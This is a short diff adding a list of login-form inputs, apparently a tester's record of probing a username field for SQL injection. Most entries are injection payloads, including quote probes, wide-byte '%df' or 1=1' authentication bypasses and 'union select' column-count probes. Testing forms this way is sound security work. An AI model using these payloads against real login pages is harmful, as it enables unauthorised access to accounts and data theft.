@@ -1,0 +1,11 @@
+User Name:'Password:
+User Name:Password:
+User Name:%df' or 1=1 -- #Password:
+User Name:%df" or 1=1 -- #Password:
+User Name:"Password:
+User Name:adminPassword:1
+User Name:adminPassword:1
+User Name:"Password:1
+User Name:ß' union select 1,2,3; -- #Password:1
+User Name:ß' union select 1,2; -- #Password:1
+User Name:%df'+union+select+1,2;+--+#Password:
